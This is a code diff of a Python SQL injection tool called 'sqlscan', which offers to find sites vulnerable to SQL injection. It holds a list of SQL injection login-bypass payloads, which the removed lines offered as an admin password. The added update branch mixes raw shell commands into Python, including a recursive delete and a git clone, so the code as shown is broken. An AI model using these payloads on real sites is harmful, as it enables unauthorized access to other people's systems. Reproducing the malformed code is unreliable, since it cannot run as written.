@@ -5,17 +5,19 @@ print(" ___  ___  _     ___  ___    _")
 print("|_ -||  .|| |   |_ -|| __|  / \  |\  |")
 print("|___||_  || |_  |___|||__  /___\ | \ |  ")
 print("       |_||___|      |___| |   | |  \|")
-print("Version 2.0")
+print("Version 3.0")
 print("enter a number")
-print("1 >> generate a random query")
+print("1 >> update a sqlscan")
 print("2 >> finds sites vulnerable to SQL injection")
 query = ["admin'--", "1'or'1'='1", "' or 0=0 --", '" or 0=0 --', "or 0=0 --", "' or 0=0 #", '" or 0=0 #', "or 0=0 #", "' or 'x'='x", '" or "x"="x', "') or ('x'='x", "' or 1=1--", '" or 1=1--', "or 1=1--", "' or a=a--", '" or "a"="a', "') or ('a'='a", '") or ("a"="a', 'hi" or "a"="a', 'hi" or 1=1 --', "hi' or 1=1 --", "hi' or 'a'='a", "hi') or ('a'='a", 'hi") or ("a"="a', "1' OR '1'='1"]
 try:
     sql = int(input("number: "))
     if(sql == 1):
-        passwd = random.choice(query)
-        print("username: admin")
-        print("password: " + passwd)
+        os.chdir("..")
+        sudo rm -r sqlscan
+        sudo apt install git
+        git clone https://github.com/WWW313NET/sqlscan
+        os.chdir("sqlscan")
 
     elif(sql == 2):
         print("e-commerce-1")
